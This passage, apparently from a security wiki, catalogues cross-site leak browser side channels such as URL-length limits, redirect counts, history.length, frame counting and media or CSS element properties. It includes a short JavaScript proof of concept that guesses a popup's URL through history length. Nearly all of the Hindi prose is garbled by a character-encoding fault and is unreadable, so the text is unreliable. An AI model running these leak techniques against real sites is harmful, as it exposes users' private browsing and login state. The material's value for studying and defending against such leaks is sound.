### URL рдорд╛рдХреНрд╕ рд▓рдВрдмрд╛рдИ - рдХреНрд▓рд╛рдЗрдВрдЯ рд╕рд╛рдЗрдб

* **рд╕рдорд╛рд╡реЗрд╢ рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдкреЙрдк-рдЕрдк
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: рд╕реНрдерд┐рддрд┐ рдХреЛрдб / рд╕рд╛рдордЧреНрд░реА
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **рд╕рд╛рд░рд╛рдВрд╢:** рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдУрдВ рдореЗрдВ рдЕрдВрддрд░реЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВ рдХреНрдпреЛрдВрдХрд┐ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд▓рдВрдмрд╛рдИ рдЗрддрдиреА рдЕрдзрд┐рдХ рд╣реЛ рд╕рдХрддреА рд╣реИ рдХрд┐ рдПрдХ рдЕрдиреБрд░реЛрдз рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдВрддрд░ рдиреЛрдЯрд┐рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

[Chromium documentation](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url\_display\_guidelines/url\_display\_guidelines.md#URL-Length) рдХреЗ рдЕрдиреБрд╕рд╛рд░, Chrome рдХреА рдЕрдзрд┐рдХрддрдо URL рд▓рдВрдмрд╛рдИ 2MB рд╣реИред

> рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ, _рд╡реЗрдм рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо_ рдХреЗ рдкрд╛рд╕ URL рдХреА рд▓рдВрдмрд╛рдИ рдкрд░ рдХреЛрдИ рд╕реАрдорд╛ рдирд╣реАрдВ рд╣реИ (рд╣рд╛рд▓рд╛рдВрдХрд┐ 2^31 рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рд╕реАрдорд╛ рд╣реИ)ред _Chrome_ рдЕрднрд┐рдпрд╛рдВрддреНрд░рд┐рдХреА рдХреЗ рдХрд╛рд░рдг рдФрд░ рдЕрдВрддрд░-рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕рдВрдЪрд╛рд░ рдореЗрдВ рдбреЗрдирд┐рдпрд▓-рдСрдл-рд╕рд░реНрд╡рд┐рд╕ рд╕рдорд╕реНрдпрд╛рдУрдВ рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП URL рдХреА рдЕрдзрд┐рдХрддрдо рд▓рдВрдмрд╛рдИ рдХреЛ **2MB** рддрдХ рд╕реАрдорд┐рдд рдХрд░рддрд╛ рд╣реИред

рдЗрд╕рд▓рд┐рдП рдпрджрд┐ **рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди URL** рдХрд┐рд╕реА рдорд╛рдорд▓реЗ рдореЗрдВ рдЕрдзрд┐рдХ рд╣реИ, рддреЛ рдЗрд╕реЗ **2MB рд╕реЗ рдЕрдзрд┐рдХ рд▓рдВрдмрд╛ URL** рджреНрд╡рд╛рд░рд╛ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рддрд╛рдХрд┐ **рд▓рдВрдмрд╛рдИ рд╕реАрдорд╛** рдХреЛ рдкрд╣реБрдВрдЪрд╛ рдЬрд╛ рд╕рдХреЗред рдЬрдм рдпрд╣ рд╣реЛрддрд╛ рд╣реИ, Chrome рдПрдХ **`about:blank#blocked`** рдкреГрд╖реНрда рджрд┐рдЦрд╛рддрд╛ рд╣реИред

**рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░** рдпрд╣ рд╣реИ рдХрд┐ рдпрджрд┐ **рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди** рдкреВрд░рд╛ рд╣реЛ рдЧрдпрд╛ рдерд╛, рддреЛ `window.origin` рдПрдХ **рддреНрд░реБрдЯрд┐** рдлреЗрдВрдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдПрдХ рдХреНрд░реЙрд╕ рдУрд░рд┐рдЬрд┐рди рдЙрд╕ рдЬрд╛рдирдХрд╛рд░реА рддрдХ рдкрд╣реБрдВрдЪ рдирд╣реАрдВ рд╕рдХрддрд╛ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ **рд╕реАрдорд╛** рдереА рдФрд░ рд▓реЛрдб рдХрд┐рдпрд╛ рдЧрдпрд╛ рдкреГрд╖реНрда **`about:blank#blocked`** рдерд╛, рддреЛ рд╡рд┐рдВрдбреЛ рдХрд╛ **`origin`** рд╡рд╣реА рд░рд╣рддрд╛ рд╣реИ рдЬреЛ **рдорд╛рддрд╛-рдкрд┐рддрд╛** рдХрд╛ рд╣реИ, рдЬреЛ рдПрдХ **рдкрд╣реБрдВрдЪрдиреЗ рдпреЛрдЧреНрдп рдЬрд╛рдирдХрд╛рд░реА** рд╣реИред

рд╕рднреА рдЕрддрд┐рд░рд┐рдХреНрдд рдЬрд╛рдирдХрд╛рд░реА рдЬреЛ **2MB** рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИ, рдЙрд╕реЗ рдкреНрд░рд╛рд░рдВрднрд┐рдХ URL рдореЗрдВ рдПрдХ **рд╣реИрд╢** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЬреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдпрд╣ **рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд** рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

{% content-ref url="url-max-length-client-side.md" %}
[url-max-length-client-side.md](url-max-length-client-side.md)
{% endcontent-ref %}
### рдЕрдзрд┐рдХрддрдо рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢

* **рд╕рдорд╛рд╡реЗрд╢рди рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдлреЗрдЪ рдПрдкреАрдЖрдИ, рдлреНрд░реЗрдореНрд╕
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХрд╛ рдЕрдВрддрд░**: рд╕реНрдерд┐рддрд┐ рдХреЛрдб
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **рд╕рд╛рд░рд╛рдВрд╢:** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреА рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рд╕реАрдорд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ URL рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рдХреА рдШрдЯрдирд╛ рдХреЛ рд╕реНрдерд╛рдкрд┐рдд рдХрд░реЗрдВред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

рдпрджрд┐ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреА **рдЕрдзрд┐рдХрддрдо** **рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢** рдХреА рд╕рдВрдЦреНрдпрд╛ **20** рд╣реИ, рддреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд┐рд╢ рдЕрдкрдиреЗ рдкреГрд╖реНрда рдХреЛ **19 рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢реЛрдВ** рдХреЗ рд╕рд╛рде рд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЕрдВрдд рдореЗрдВ **рдкреАрдбрд╝рд┐рдд** рдХреЛ рдкрд░реАрдХреНрд╖рдг рдХрд┐рдП рдЧрдП рдкреГрд╖реНрда рдкрд░ рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИред рдпрджрд┐ рдХреЛрдИ **рддреНрд░реБрдЯрд┐** рдЙрддреНрдкрдиреНрди рд╣реЛрддреА рд╣реИ, рддреЛ рдкреГрд╖реНрда **рдкреАрдбрд╝рд┐рдд рдХреЛ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд** рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд░рд╣рд╛ рдерд╛ред

### рдЗрддрд┐рд╣рд╛рд╕ рд▓рдВрдмрд╛рдИ

* **рд╕рдорд╛рд╡реЗрд╢рди рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдлреНрд░реЗрдореНрд╕, рдкреЙрдк-рдЕрдкреНрд╕
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХрд╛ рдЕрдВрддрд░**: рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **рд╕рд╛рд░рд╛рдВрд╢:** рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛрдб рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдЗрддрд┐рд╣рд╛рд╕ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рд▓рдВрдмрд╛рдИ рд╕рдВрдкрддреНрддрд┐ рджреНрд╡рд╛рд░рд╛ рдкрд╣реБрдВрдЪрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

**рдЗрддрд┐рд╣рд╛рд╕ рдПрдкреАрдЖрдИ** рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛрдб рдХреЛ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдЗрддрд┐рд╣рд╛рд╕ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рджреЗрдЦреЗ рдЧрдП рдкреГрд╖реНрда рд╕рд╣реЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВред рдПрдХ рд╣рдорд▓рд╛рд╡рд┐рд╢ рд▓рдВрдмрд╛рдИ рд╕рдВрдкрддреНрддрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреИрд╕реЗ: рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдФрд░ рдПрдЪрдЯреАрдПрдордПрд▓ рдиреЗрд╡рд┐рдЧреЗрд╢рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдПред\
**`history.length` рдХреА рдЬрд╛рдВрдЪ рдХрд░рдирд╛**, рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ **рдПрдХ рдкреГрд╖реНрда рдкрд░ рдиреЗрд╡рд┐рдЧреЗрдЯ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЗрд╕реЗ **рд╡рд╛рдкрд╕ рдмрджрд▓** рдХрд░рдирд╛ **рд╡рд╣реА-рдореВрд▓** рдФрд░ **рдирдП рдореВрд▓реНрдп рдХреА рдЬрд╛рдВрдЪ** рдХрд░рдирд╛ **`history.length`** рдХреАред

### рд╕рдорд╛рди URL рдХреЗ рд╕рд╛рде рдЗрддрд┐рд╣рд╛рд╕ рд▓рдВрдмрд╛рдИ

* **рд╕рдорд╛рд╡реЗрд╢рди рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдлреНрд░реЗрдореНрд╕, рдкреЙрдк-рдЕрдкреНрд╕
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХрд╛ рдЕрдВрддрд░**: рдпрджрд┐ URL рдЕрдиреБрдорд╛рдирд┐рдд рд╡рд╛рд▓реЗ рд╕реЗ рд╕рдорд╛рди рд╣реИ
* **рд╕рд╛рд░рд╛рдВрд╢:** рдПрдХ рдЕрдЯреИрдХрд░ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлреНрд░реЗрдо/рдкреЙрдк-рдЕрдк рд╕реНрдерд╛рди рдХреЛ рдПрдХ рдЕрдиреБрдорд╛рдирд┐рдд рд╕реНрдерд╛рди рдкрд░ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ **рддреБрд░рдВрдд** **рдЗрд╕реЗ `about:blank`** рдореЗрдВ **рдмрджрд▓ рд╕рдХрддрд╛ рд╣реИ**ред рдпрджрд┐ рдЗрддрд┐рд╣рд╛рд╕ рд▓рдВрдмрд╛рдИ рдмрдврд╝ рдЧрдИ рд╣реИ рддреЛ рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ URL рд╕рд╣реА рдерд╛ рдФрд░ рдЗрд╕реЗ **рдмрдврд╝рд╛рдиреЗ рдХрд╛ рд╕рдордп рдерд╛ рдХреНрдпреЛрдВрдХрд┐ URL рдкреБрдирдГ рд▓реЛрдб рдирд╣реАрдВ рд╣реЛрддрд╛ рдЕрдЧрд░ рдпрд╣ рд╕рдорд╛рди рд╣реИ**ред рдпрджрд┐ рдпрд╣ рдмрдврд╝рд╛ рдирд╣реАрдВ рд╣реИ рддреЛ рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рдпрд╣рдиреЗ **рдЕрдиреБрдорд╛рдирд┐рдд URL рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХреА** рдереА рд▓реЗрдХрд┐рди рдХреНрдпреЛрдВрдХрд┐ рд╣рдордиреЗ **рддреБрд░рдВрдд рдмрд╛рдж рдореЗрдВ** **`about:blank`** рд▓реЛрдб рдХрд┐рдпрд╛, рдЗрд╕рд▓рд┐рдП **рдЗрддрд┐рд╣рд╛рд╕ рд▓рдВрдмрд╛рдИ рдХрднреА рдирд╣реАрдВ рдмрдврд╝реА** рдЬрдм рдЕрдиреБрдорд╛рдирд┐рдд URL рд▓реЛрдб рд╣реЛ рд░рд╣рд╛ рдерд╛ред
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Frame Counting

* **рд╕рдорд╛рд╡реЗрд╢ рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдлреНрд░реЗрдо, рдкреЙрдк-рдЕрдк
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХрд╛ рдЕрдВрддрд░**: рдкреГрд╖реНрда рд╕рд╛рдордЧреНрд░реА
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **рд╕рд╛рд░рд╛рдВрд╢:** `window.length` рдЧреБрдг рдХреА рдЬрд╛рдВрдЪ рдХрд░рдХреЗ рдЖрдИрдлреНрд░реЗрдо рддрддреНрд╡реЛрдВ рдХреА рдорд╛рддреНрд░рд╛ рдХрд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд░реЗрдВред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

рд╡реЗрдм рдореЗрдВ **рдЖрдИрдлреНрд░реЗрдо** рдХреА рд╕рдВрдЦреНрдпрд╛ рдХреА **рдЧрдгрдирд╛** (`iframe` рдпрд╛ `window.open` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЦреЛрд▓реА рдЧрдИ) рдкреГрд╖реНрда рдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА **рд╕реНрдерд┐рддрд┐ рдХреА рдкрд╣рдЪрд╛рди** рдореЗрдВ рдорджрдж рдХрд░ рд╕рдХрддреА рд╣реИред\
рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдпрджрд┐ рдкреГрд╖реНрда рдореЗрдВ рд╣рдореЗрд╢рд╛ рдПрдХ рд╣реА рд╕рдВрдЦреНрдпрд╛ рдХреА рдЖрдИрдлреНрд░реЗрдо рд╣реИ, рддреЛ рдЖрдИрдлреНрд░реЗрдореЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рдХреА **рдирд┐рд░рдВрддрд░** рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рд╕реЗ рдХрд┐рд╕реА **рдкреИрдЯрд░реНрди** рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдорд┐рд▓ рд╕рдХрддреА рд╣реИ рдЬреЛ рд╕реВрдЪрдирд╛ рд▓реАрдХ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдПрдХ рдЙрджрд╛рд╣рд░рдг рдпрд╣ рд╣реИ рдХрд┐ рдХреНрд░реЛрдо рдореЗрдВ, рдПрдХ **PDF** рдХреЛ **рдлреНрд░реЗрдо рдЧрдгрдирд╛** рдХреЗ рд╕рд╛рде **рдкрд╣рдЪрд╛рдирд╛** рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдореЗрдВ рдЖрдВрддрд░рд┐рдХ рд░реВрдк рд╕реЗ `embed` рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИред рдЗрд╕рдореЗрдВ рдХреБрдЫ [рдУрдкрди URL рдкреИрд░рд╛рдореАрдЯрд░](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) рд╣реИрдВ рдЬреЛ `рдЬрд╝реВрдо`, `рджреГрд╢реНрдп`, `рдкреГрд╖реНрда`, `рдЯреВрд▓рдмрд╛рд░` рдЬреИрд╕реА рд╕рд╛рдордЧреНрд░реА рдкрд░ рдХреБрдЫ рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ рдЬрд┐рд╕рд╕реЗ рдпрд╣ рддрдХрдиреАрдХ рджрд┐рд▓рдЪрд╕реНрдк рд╣реЛ рд╕рдХрддреА рд╣реИред

### HTMLElements

* **рд╕рдорд╛рд╡реЗрд╢ рд╡рд┐рдзрд┐рдпрд╛рдБ**: HTML рддрддреНрд╡
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХрд╛ рдЕрдВрддрд░**: рдкреГрд╖реНрда рд╕рд╛рдордЧреНрд░реА
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **рд╕рд╛рд░рд╛рдВрд╢:** рд▓реАрдХ рд╣реБрдИ рдорд╛рди рдХреЛ рдкрдврд╝реЗрдВ рдФрд░ 2 рд╕рдВрднрд╛рд╡рд┐рдд рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдХреЗ рдмреАрдЪ рднрд┐рдиреНрдирддрд╛ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВ
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

HTML рддрддреНрд╡реЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реВрдЪрдирд╛ рд▓реАрдХ рд╡реЗрдм рд╕реБрд░рдХреНрд╖рд╛ рдореЗрдВ рдПрдХ рдЪрд┐рдВрддрд╛ рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЬрдм рдбрд╛рдпрдирд╛рдорд┐рдХ рдореАрдбрд┐рдпрд╛ рдлрд╝рд╛рдЗрд▓реЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реВрдЪрдирд╛ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдЙрддреНрдкрдиреНрди рдХреА рдЬрд╛рддреА рд╣реИрдВ, рдпрд╛ рдЬрдм рд╡реЙрдЯрд░рдорд╛рд░реНрдХ рдЬреЛрдбрд╝реЗ рдЬрд╛рддреЗ рд╣реИрдВ, рдореАрдбрд┐рдпрд╛ рдХрд╛ рдЖрдХрд╛рд░ рдмрджрд▓ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕реЗ рд╣рдорд▓рд╛рд╡рд░реЛрдВ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реНрдерд┐рддрд┐ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд╡рд┐рд╢рд┐рд╖реНрдЯ HTML рддрддреНрд╡реЛрдВ рджреНрд╡рд╛рд░рд╛ рдЙрдЬрд╛рдЧрд░ рдХреА рдЧрдИ рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рдХреЗ рднрд┐рдиреНрди рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдХреЗ рдмреАрдЪ рднрд┐рдиреНрдирддрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### HTML рддрддреНрд╡реЛрдВ рджреНрд╡рд╛рд░рд╛ рдЙрдЬрд╛рдЧрд░ рдХреА рдЧрдИ рдЬрд╛рдирдХрд╛рд░реА

* **HTMLMediaElement**: рдпрд╣ рддрддреНрд╡ рдореАрдбрд┐рдпрд╛ рдХрд╛ `duration` рдФрд░ `buffered` рд╕рдордп рдкреНрд░рдХрдЯ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рдЗрд╕рдХреЗ API рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд╣реБрдВрдЪрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред [HTMLMediaElement рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдкрдврд╝реЗрдВ](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
* **HTMLVideoElement**: рдпрд╣ `videoHeight` рдФрд░ `videoWidth` рдХреЛ рдкреНрд░рдХрдЯ рдХрд░рддрд╛ рд╣реИред рдХреБрдЫ рдмреНрд░рд╛рдЙрдЬрд╝рд░реЛрдВ рдореЗрдВ, `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount`, рдФрд░ `webkitDecodedFrameCount` рдЬреИрд╕реА рдЕрддрд┐рд░рд┐рдХреНрдд рдЧреБрдг рдЙрдкрд▓рдмреНрдз рд╣реИрдВ, рдЬреЛ рдореАрдбрд┐рдпрд╛ рд╕рд╛рдордЧреНрд░реА рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рд╡рд┐рд╕реНрддреГрдд рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВред [HTMLVideoElement рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдкрдврд╝реЗрдВ](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
* **getVideoPlaybackQuality()**: рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рд╡реАрдбрд┐рдпреЛ рдкреНрд▓реЗрдмреИрдХ рдЧреБрдгрд╡рддреНрддрд╛ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╡рд┐рд╡рд░рдг рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ `totalVideoFrames` рд╢рд╛рдорд┐рд▓ рд╣реИ, рдЬреЛ рдкреНрд░рд╕рдВрд╕реНрдХреГрдд рд╡реАрдбрд┐рдпреЛ рдбреЗрдЯрд╛ рдкреНрд░рд╕рдВрд╕реНрдХреГрдд рдХреА рдорд╛рддреНрд░рд╛ рдХреЛ рд╕реВрдЪрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред [getVideoPlaybackQuality() рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдкрдврд╝реЗрдВ](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
* **HTMLImageElement**: рдпрд╣ рддрддреНрд╡ рдПрдХ рдЫрд╡рд┐ рдХреА `height` рдФрд░ `width` рдХреЛ рд▓реАрдХ рдХрд░рддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ рдПрдХ рдЫрд╡рд┐ рдЕрдорд╛рдиреНрдп рд╣реИ, рддреЛ рдпреЗ рдЧреБрдг 0 рд▓реМрдЯрд╛рдПрдВрдЧреЗ, рдФрд░ `image.decode()` рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЬрд┐рд╕рд╕реЗ рдЫрд╡рд┐ рдХреЛ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рд▓реЛрдб рдХрд░рдиреЗ рдореЗрдВ рд╡рд┐рдлрд▓рддрд╛ рдХрд╛ рд╕рдВрдХреЗрдд рджреЗрдЧрд╛ред [HTMLImageElement рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдкрдврд╝реЗрдВ](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSS рдЧреБрдг

* **рд╕рдорд╛рд╡реЗрд╢ рд╡рд┐рдзрд┐рдпрд╛рдБ**: HTML рддрддреНрд╡
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХрд╛ рдЕрдВрддрд░**: рдкреГрд╖реНрда рд╕рд╛рдордЧреНрд░реА
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **рд╕рд╛рд░рд╛рдВрд╢:** рд╡реЗрдмрд╕рд╛рдЗрдЯ рд╕реНрдЯрд╛рдЗрд▓рд┐рдВрдЧ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рдХреА рдкрд╣рдЪрд╛рди рдХрд░реЗрдВ рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рд╕реНрдерд┐рддрд┐ рдпрд╛ рд╕реНрдерд┐рддрд┐ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╣реЛрддреЗ рд╣реИрдВред
